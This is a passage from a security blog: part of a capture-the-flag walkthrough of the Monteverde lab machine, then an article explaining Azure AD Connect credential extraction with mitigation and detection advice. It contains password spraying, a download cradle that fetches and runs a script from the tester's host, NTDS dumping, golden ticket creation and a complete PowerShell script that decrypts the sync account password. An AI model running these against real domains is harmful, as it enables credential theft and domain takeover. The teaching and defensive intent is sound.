ldap://monteverde.MEGABANK.LOCAL -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=group))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapGroups.txt Discoveries:\nLooking at the list of groups there are some interesting standout groups here: SQLServer2005SQLBrowserUser$MONTEVERDE This is interesting as it does not appear the SQL service is running publicly on a port. Azure This could be part of an azure environment which could be interesting. Reception Operations Trading HelpDesk Developers We can also generate a list of users who are members of specific groups too: for group in $(cat ldapGroups.txt); do ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; -s sub \u0026quot;(\u0026amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=$group,OU=Groups,DC=MEGABANK,DC=LOCAL))\u0026quot; \u0026gt;\u0026gt; ldapGroupMemberships.txt; done DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Standard entries for an AD env. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt We have some usernames, these were all found using LDAP, however this is still good to have. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Guest account is disabled and null sessions are not allowed it appears. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] It appears that SABatchJobs is using their username as a password, naught naughty. 2. Foothold: Enumerating the Domain SABatchJobs: Running a bloodhound collection: As we have creds now we can run a remote bloodhound collection: python3 bloodhound.py -dc monteverde.$domain -c All -u $user -p $user -d $domain -ns $box +Note+: The reason this keeps going and I do not check it initially is as it was running the collection I continued to manually enumerate. Enumerating SMB Shares: Listing the shares we can see some interesting entries: netexec smb $box -u $user -p $user --shares The azure_uploads \u0026amp; users$ is particularly interesting. I check the azure_uploads directory but it is empty: smbclient -U $domain\\\\$user \\\\\\\\$box\\\\azure_uploads Finding azure.xml in the user mhope\u0026rsquo;s user share: Enumerating the users$ shares I find a file called azure.xml in the user\u0026rsquo;s mhope directory: smbclient -U $domain\\\\$user \\\\\\\\$box\\\\users$ I download it: Finding a hard-coded password in azure.xml: Reading the azure.xml file I find a hard-coded password within it: Discovering that mhope re-uses passwords: I check the password for re-use and it appears that mhope re-uses passwords: netexec smb $box -u $user -p $pass --shares Connecting to the host as mhope: I connect using evil-winrm: evil-winrm -i $box -u $user -p $pass After some general enumeration I elect to check bloodhound to see if we have any obvious privilege escalation paths. 3. Privilege Escalation: Discovering mhope is part of the azure admins group: Checking bloodhound I can see that mhope is a part of the azure admins group:\nI quickly check for Azure Admin privilege escalation path on google and find the following article:\nhttps://blog.xpnsec.com/azuread-connect-for-redteam/ So we need to find out if Azure Connect is running before this is a viable privilege escalation path. Enumerating the Azure Service: Checking Azure Connect Directory Exists \u0026amp; The Service Is Running: I check if Azure connect AD Sync directory exists:\nTest-Path \u0026quot;C:\\Program Files\\Microsoft Azure AD Sync\u0026quot; True, so this could work. Lets enumerate further. Let\u0026rsquo;s check if the AD Sync binary is installed:\nGet-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync -Name \u0026quot;ImagePath\u0026quot; So it\u0026rsquo;s running, good. Checking for the ADSync Database: From reading the article, we can see that LocalDB should be running on a default installation: It says:\nNow by default when deploying the connector a new database is created on the host using SQL Server\u0026rsquo;s LOCALDB. To view information on the running instance, we can use the installed SqlLocalDB.exe tool: \u0026lt;SNIP\u0026gt; So what are the requirements to complete this exfiltration of credentials? Well we will need to have access to the LocalDB (if configured to use this DB)\nWhat is SQL Server Express LocalDB? Overview of LocalDB: LocalDB is a lightweight version of SQL Server Express designed for developers to quickly and easily create and test SQL Server databases without the overhead of a full SQL Server installation. Key Features of LocalDB:\nDeveloper-focused: It\u0026rsquo;s intended for development and local testing purposes, providing a simple and fast setup for SQL Server database instances. On-demand: LocalDB runs on-demand, meaning it starts up when an application tries to connect and shuts down when not in use, minimizing resource usage. User-level instance: LocalDB runs under the user\u0026rsquo;s context, without requiring admin privileges to manage or install. No configuration needed: Unlike a full SQL Server instance, LocalDB doesn\u0026rsquo;t require setup or configuration—it\u0026rsquo;s essentially plug-and-play. SQL Server API compatibility: LocalDB supports the same T-SQL commands and APIs as the full version of SQL Server, so code written against LocalDB will work with any edition of SQL Server. Use Cases of LocalDB:\nDevelopment environment: Ideal for developers needing a local SQL Server database without complex configuration or high resource use. Testing and debugging: Developers can create, test, and debug SQL Server applications in a contained environment before deploying to a full SQL Server instance. Unit testing: Allows database-related unit testing to be performed locally and quickly. Core Characteristics of LocalDB:\nInstance Type:\nLocalDB runs as a user-mode process, meaning it\u0026rsquo;s user-specific and does not require a system-wide installation of SQL Server. Each user on a machine can have their own instances of LocalDB. Communication via Named Pipes:\nUnlike full SQL Server instances that communicate via TCP/IP ports, LocalDB uses named pipes for connections, ensuring simplicity and security for local communication. No Service Required:\nLocalDB does not run as a Windows service. It is an on-demand process that starts and stops as needed when an application makes a connection. Supports Multiple Instances:\nYou can run multiple LocalDB instances, such as the default instance (MSSQLLocalDB) or custom-named instances. Each instance is independent and isolated from others. Further reading:\nhttps://learn.microsoft.com/en-us/sql/tools/sqlLocalDB-utility?view=sql-server-ver16 Looking for LocalDB binary: Looking online I find this article which says where the SqlLocalDB.exe should be found:\n\u0026quot;C:\\Program Files\\Microsoft SQL Server\\160\\Tools\\Binn\\SqlLocalDB.exe\u0026quot; Not found. Searching for SqlLocalDB.exe\nLooking at the folder structure of: \u0026quot;C:\\Program Files\\Microsoft SQL Server\u0026quot; I can see that there is no 160 folder. Looking online, I find this post on StackOverflow:\nIt says we should be able to find the binary in either \u0026quot;C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn or \u0026quot;C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn As there is no 120 on our host I check 110 Finding SQLCMD.EXE in 110: I check 110 \u0026amp; can see that there is no SqlLocalDB.exe but there is a SQLCMD.EXE executable:\nI check the other folders 140, 150, 80 \u0026amp; 90 but there is nothing of interest. SQLCMD.EXE is used for interacting with local/remote SQL instances. We did not see SQL running in our NMAP scans, so should check if it\u0026rsquo;s running internally:\nnetstat -ano | findstr :1433 Okay, looks to be running internally, which means this is a non-standard installation of Azure AD Connect that isn\u0026rsquo;t using LocalDB, so it must be running SQL. Connecting to the SQL Instance: I check if we can run commands on the SQL Instance: sqlcmd -S MONTEVERDE -Q \u0026quot;SELECT name FROM master.dbo.sysdatabases\u0026quot; We can \u0026amp; I can see that the ADSync database is present! 4. Ownership: Modifying XPN\u0026rsquo;s POC to work: Looking at the POC on XPN\u0026rsquo;s page we can see the opening line says:\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; https://blog.xpnsec.com/azuread-connect-for-redteam/ However this instance is not using localdb so we need to modify this:\nData Source=(localdb)\\.\\ADSync: Uses localdb, a lightweight version of SQL Server primarily meant for developers (which is not running). The (localdb)\\.\\ADSync points to a specific instance of LocalDB. Initial Catalog=ADSync: Specifies the database ADSync that we want to connect to. Updated Version:\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True\u0026#34; Server=127.0.0.1: Uses the local machine\u0026rsquo;s loopback address (127.0.0.1) to connect to the SQL Server instance. As we know that SQL is running internally. Integrated Security=True: This enables Windows Authentication, using the current user\u0026rsquo;s credentials to authenticate with the SQL Server. As we know mhope has the required permissions to connect to the instance: I actually did a deep dive into how this whole attack works, you can find it here:\nhttps://bloodstiller.com/articles/azureadconnect/ Running the Exploit to Extract the Administrator Password: I start my python webserver:\npython3 -h http.server 9000 I use a download cradle to run the exploit:\niex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectPOC.ps1') We get the administrators password. +Deep Dive+: I have a deep dive into download cradles and how they work: https://bloodstiller.com/articles/understandingdownloadcradles/ I verify the password works using netexec:\nnetexec smb $box -u $user -p $pass --shares Let\u0026rsquo;s grab our root flag too.\n5. Persistence: Dumping NTDS.dit: I use netexec to dump the NTDS.dit: netexec smb $box -u $user -p $pass -M ntdsutil Creating a Golden Ticket: Using impacket-lookupsid to extract the domain SID:\nimpacket-lookupsid $domain/administrator@$box -domain-sids I use impacket-ticketer to create the ticket:\nIt kicks out a bunch of errors but creates the administrator.ccache I load the ticket into the KRB5CCNAME Variable:\nexport KRB5CCNAME=./administrator.ccache I sync my clock with the target:\nsudo ntpdate -s monteverde.$domain I connect using impacket-psexec:\nimpacket-psexec monteverde.$domain -k Lessons Learned: What did I learn? I learned ALOT about Azure AD Connect. I would not have been able to do this without the post from xpn: https://blog.xpnsec.com/azuread-connect-for-redteam/ Honestly so much about the AD Connect service. I have done a more thorough writeup and have actually broken down xpn\u0026rsquo;s exploit in this post: https://bloodstiller.com/articles/azureadconnect/ What silly mistakes did I make? Not too bad this time, it was more about just getting my head around Azure AD Connect and understanding XPN\u0026rsquo;s script took me the longest Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "tags": ["Windows","Active Directory","Azure AD Connect","Azure","SQL","MSSQL",],
        "content": "Used-For: Connecting on-premises AD instances with Azure cloud instances Overview: Azure AD Connect is a Microsoft tool designed to bridge on-premises Active Directory (AD) with Azure AD in the cloud. It offers several synchronization methods:\nPass-through Authentication (PTA): Validates users\u0026rsquo; passwords directly against on-premises AD Enables enforcement of on-premises security and password policies Federated Authentication (ADFS): Uses a separate federated authentication system like AD FS Provides advanced capabilities like multi-factor authentication and third-party MFA integration Password Hash Synchronization (PHS): Synchronizes a hash of the hash of users\u0026rsquo; passwords from on-premises AD to Azure AD Allows for cloud-based authentication without on-premises infrastructure dependency Password Hash Synchronization (PHS) Method: Here\u0026rsquo;s a simplified diagram illustrating the Password Hash Synchronization (PHS) method:\n+----------------------+ | On-Premises AD | +----------------------+ | | \u0026#34;User accounts \u0026amp; attributes\u0026#34; v +----------------------+ | Azure AD Connect | | +------------------+ | | | Azure AD Sync | | | | Service | | | +------------------+ | | +------------------+ | | | Password Hash | | | | Sync Agent | | | +------------------+ | +----------------------+ | | | \u0026#34;Synchronized | \u0026#34;Synchronized | user accounts| password hashes\u0026#34; | \u0026amp; attributes\u0026#34;| v v +----------------------+ | Azure AD | +----------------------+ +Note+: Password hashes are further hashed before being sent to Azure AD for additional security. This diagram illustrates the flow of data in the PHS method:\nUser accounts and attributes are sent from the on-premises AD to the Azure AD Sync Service within Azure AD Connect. Password hashes are separately processed by the Password Hash Sync Agent. Synchronized user accounts and attributes are sent to Azure AD. Synchronized (and further hashed) password hashes are sent to Azure AD. The separation of user data and password hash synchronization processes within Azure AD Connect is a key security feature, but it\u0026rsquo;s also what allows for potential exploitation if an attacker gains access to the Azure AD Connect server.\nInstallation Configurations: A default installation of Azure AD Connect uses a SQL Server Express instance as a LocalDB, connecting over a named pipe. This configuration is common and straightforward to set up.\nHowever, it\u0026rsquo;s important to note that custom installations are possible. In some cases, Azure AD Connect might be configured to use a full Microsoft SQL Server installation. This SQL Server could be bound to a port internally but not accessible externally. Such custom setups can occur when organizations have specific requirements or are integrating Azure AD Connect with existing database infrastructure.\nUnderstanding the installation configuration is crucial for both security assessments and potential exploitation attempts. It affects how the system can be enumerated, what vulnerabilities might be present, and how any potential attacks could be carried out.\nThe Vulnerability Context The exploit we\u0026rsquo;ll be discussing doesn\u0026rsquo;t rely on a software bug, but rather on the architectural design of Azure AD Connect and potential misconfigurations in its deployment. This is particularly relevant to installations using Password Hash Synchronization (PHS).\nTechnical Deep Dive 1. The MSOL Account During installation, Azure AD Connect creates a service account named MSOL_[HEX]. This account is granted extensive permissions, including:\nReplicating Directory Changes Replicating Directory Changes All Replicating Directory Changes In Filtered Set These permissions allow the account to perform Directory Replication Service (DRS) operations, including +DCSync+.\n2. Password Hash Synchronization (PHS) Mechanism PHS uses the Microsoft.Online.PasswordSynchronization.dll assembly to handle hash synchronization. This DLL leverages the same DRS APIs used by tools like Mimikatz for +DCSync+ operations.\n3. Local Database Storage Azure AD Connect stores its configuration in a SQL Server LocalDB instance by default. Key information includes:\nDatabase: ADSync Table: mms_management_agent Fields of interest: private_configuration_xml encrypted_configuration 4. Encryption Mechanism The MSOL account password is encrypted and stored in the encrypted_configuration field. Decryption is handled by mcrypt.dll, located in the Azure AD Connect installation directory.\nC:\\Program Files\\Microsoft Azure AD Sync\\Binn\\mcrypt.dll Enumerating Azure AD Connect: Before attempting to exploit Azure AD Connect, it\u0026rsquo;s important to confirm its presence and understand its configuration. Here\u0026rsquo;s a structured approach to enumeration:\n1. Confirm Azure AD Connect Installation: Check for the Azure AD Connect installation directory:\nTest-Path \u0026#34;C:\\Program Files\\Microsoft Azure AD Sync\u0026#34; Check for Azure AD Connect service in the registry:\nGet-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync Check for the Azure AD Connect synchronization service:\nGet-Service ADSync 2. Identify Azure AD Connect Accounts: Search for MSOL_ or AAD_ accounts in Active Directory: Get-ADUser -Filter \u0026#34;samaccountname -like \u0026#39;MSOL_*\u0026#39; -or samaccountname -like \u0026#39;AAD_*\u0026#39;\u0026#34; -Properties * 3. Determine Database Configuration: Check for LocalDB (default configuration):\nSqlLocalDB.exe info ADSync If LocalDB is not found, check for full SQL Server installation:\nGet-ChildItem \u0026#34;C:\\Program Files\\Microsoft SQL Server\u0026#34; -ErrorAction SilentlyContinue If this is found jump to step 5 4. LocalDB Enumeration (if applicable): List LocalDB instances:\nSqlLocalDB.exe info Start the ADSync instance if it\u0026rsquo;s not running:\nSqlLocalDB.exe start ADSync Get the pipe name for the ADSync instance:\nSqlLocalDB.exe info ADSync | findstr \u0026#34;Instance pipe name\u0026#34; 5. SQL Server Enumeration (for custom installations): Check for SQL Server network configuration:\nnetstat -ano | findstr :1433 Enumerate SQL Server instances:\nGet-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL\u0026#34; Check for custom database configuration in Azure AD Connect files:\nGet-Content \u0026#34;C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf\u0026#34; 6. Determine Synchronization Method (GUI only): Open the Synchronization Service Manager:\nC:\\Program Files\\Microsoft Azure AD Sync\\UIShell\\miisclient.exe In the \u0026ldquo;Connectors\u0026rdquo; tab, look for a connector of type \u0026ldquo;Windows Azure Active Directory (Microsoft)\u0026rdquo;.\nCheck if the \u0026ldquo;Password Synchronization\u0026rdquo; column shows \u0026ldquo;Enabled\u0026rdquo; for Password Hash Synchronization.\n7. Check for Required Permissions Verify current user\u0026rsquo;s group membership:\nwhoami /groups Look for \u0026ldquo;BUILTIN\\Administrators\u0026rdquo; or \u0026ldquo;ADSyncAdmins\u0026rdquo; in the output.\n+Note+: It is also worth checking if the user is part of any other Administrator groups with inherited permissions etc.\n8. Check if we can interact with the database (SQL Custom installation): In this example if the default LocalDB is NOT being used we can see if it\u0026rsquo;s possible to query the underlying database using sqlcmd (if it\u0026rsquo;s installed) sqlcmd -S \u0026lt;FQDNINSTANCE\u0026gt; -Q \u0026#34;SELECT name FROM master.dbo.sysdatabases\u0026#34; +Attacking Azure AD Connect+ Exploitating Azure AD Connect Using PowerShell: Here\u0026rsquo;s a complete PowerShell script that demonstrates the exploitation process:\nThis script must be run on the same machine as the Azure AD Connect server. This script must be run with the same privileges as the MSOL account. This script is by @_xpn_ \u0026amp; the original can be found here: https://blog.xpnsec.com/azuread-connect-for-redteam/ https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1 +Note+: I am using this script and explaining it here for educational purposes. You can see my walkthrough for the box Monteverde to see a full demonstration of this in action. https://bloodstiller.com/walkthroughs/monteverde-box/ Write-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; $client.Open() $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $key_id = $reader.GetInt32(0) $instance_id = $reader.GetGuid(1) $entropy = $reader.GetGuid(2) $reader.Close() $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close() add-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2) $decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted) $domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name = \u0026#39;Password\u0026#39;; Expression = {$_.node.InnerText}} Write-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain) Write-Host (\u0026#34;Username: \u0026#34; + $username.Username) Write-Host (\u0026#34;Password: \u0026#34; + $password.Password) Let\u0026rsquo;s break down the key parts of this exploit:\n1. Connecting to the Database: LocalDB Version: $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; $client.Open() Line-by-line breakdown: Creates a new SqlConnection object to connect to the LocalDB instance. $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026quot;Data \u0026quot;Data Source=(localdb)\\.\\ADSync\u0026quot; specifies the LocalDB instance name. \u0026quot;Initial Catalog=ADSync\u0026quot; specifies the database name. $client.Open() Opens the connection to the database. SQL Server Version:\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True\u0026#34; $client.Open() Line-by-line breakdown: Creates a new SqlConnection object to connect to a full SQL Server instance. $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026quot;Server=127.0.0.1\u0026quot; specifies the local machine\u0026rsquo;s loopback address, as SQL is running internally. \u0026quot;Database=ADSync\u0026quot; specifies the database name. \u0026quot;Integrated Security=True\u0026quot; enables Windows Authentication, using the current user\u0026rsquo;s credentials. The current user would need to have the correct permissions on the SQL database. $client.Open() Opens the connection to the database. This version would be used if attacking a full SQL Server instance running locally on the host, rather than the standard LocalDB installation. 2. Retrieving Encryption Keys $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $key_id = $reader.GetInt32(0) $instance_id = $reader.GetGuid(1) $entropy = $reader.GetGuid(2) $reader.Close() Line-by-line breakdown: $cmd = $client.CreateCommand()\nCreates a new SqlCommand object associated with the connection. $cmd.CommandText = \u0026quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026quot;\nSets the SQL query to retrieve encryption key information. $reader = $cmd.ExecuteReader()\nExecutes the query and returns a SqlDataReader object. $reader.Read() | Out-Null\nReads the first row of the result set. $key_id = $reader.GetInt32(0)\nRetrieves the keyset_id value from the first column. $instance_id = $reader.GetGuid(1)\nRetrieves the instance_id value from the second column. $entropy = $reader.GetGuid(2)\nRetrieves the entropy value from the third column. $reader.Close()\nCloses the reader to free up resources. 3. Retrieving Encrypted Configuration $cmd = $client.CreateCommand() $cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34; $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close() Line-by-line breakdown: $cmd = $client.CreateCommand()\nCreates a new SqlCommand object. $cmd.CommandText = \u0026quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\u0026quot;\nSets the SQL query to retrieve the encrypted configuration for the AD management agent. $reader = $cmd.ExecuteReader()\nExecutes the query and returns a SqlDataReader object. $reader.Read() | Out-Null\nReads the first row of the result set. $config = $reader.GetString(0)\nRetrieves the private_configuration_xml value from the first column. $crypted = $reader.GetString(1)\nRetrieves the encrypted_configuration value from the second column. $reader.Close()\nCloses the reader. 4. Decrypting the Configuration add-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2) $decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted) Line-by-line breakdown: add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'\nLoads the mcrypt.dll library for decryption. $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager\nCreates a new KeyManager object for handling encryption keys. $km.LoadKeySet($entropy, $instance_id, $key_id)\nLoads the key set using the previously retrieved entropy, instance_id, and key_id. $key = $null\nInitializes a variable to store the active credential key. $km.GetActiveCredentialKey([ref]$key)\nRetrieves the active credential key. $key2 = $null\nInitializes a variable to store a secondary key. $km.GetKey(1, [ref]$key2)\nRetrieves the secondary key (key ID 1). $decrypted = $null\nInitializes a variable to store the decrypted configuration. $key2.DecryptBase64ToString($crypted, [ref]$decrypted)\nDecrypts the encrypted configuration using the secondary key. 5. Extracting Credentials $domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}} $username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}} $password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name = \u0026#39;Password\u0026#39;; Expression = {$_.node.InnerText}} Write-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain) Write-Host (\u0026#34;Username: \u0026#34; + $username.Username) Write-Host (\u0026#34;Password: \u0026#34; + $password.Password) Line-by-line breakdown: $domain = select-xml -Content $config -XPath \u0026quot;//parameter[@name='forest-login-domain']\u0026quot; | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}\nExtracts the domain from the configuration XML using XPath. $username = select-xml -Content $config -XPath \u0026quot;//parameter[@name='forest-login-user']\u0026quot; | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}\nExtracts the username from the configuration XML using XPath. $password = select-xml -Content $decrypted -XPath \u0026quot;//attribute\u0026quot; | select @{Name = 'Password'; Expression = {$_.node.InnerText}}\nExtracts the password from the decrypted configuration using XPath. Write-Host (\u0026quot;Domain: \u0026quot; + $domain.Domain)\nDisplays the extracted domain. Write-Host (\u0026quot;Username: \u0026quot; + $username.Username)\nDisplays the extracted username. Write-Host (\u0026quot;Password: \u0026quot; + $password.Password)\nDisplays the extracted password. Exploiting AD Connect Using adconnectdump : It is also possible to dump credentials using dirkjanm\u0026rsquo;s tools found in the adconnect repo:\nThere are 3 different tools available which require specific circumstances to use. I will not go into detail here. I am just adding as a reference. Building is required using Visual Studio:\nExample of this attack: +Walkthrough+: for the box Monteverde https://bloodstiller.com/walkthroughs/monteverde-box/ Mitigation Strategies Implement strict access controls on the Azure AD Connect server. Use Just-In-Time (JIT) access for administrative tasks. Enable and monitor advanced auditing for the MSOL account. Consider using Pass-through Authentication (PTA) instead of PHS if feasible. Regularly rotate the MSOL account password. Implement network segmentation to limit access to the Azure AD Connect server. Use a hardware security module (HSM) for key storage if possible. Detection Monitor for:\nUnusual queries to the LocalDB instance Attempts to load or access mcrypt.dll Unexpected use of the MSOL account, especially for replication activities By understanding this process, security teams can better protect their Azure AD Connect deployments and detect potential exploitation attempts.\n",
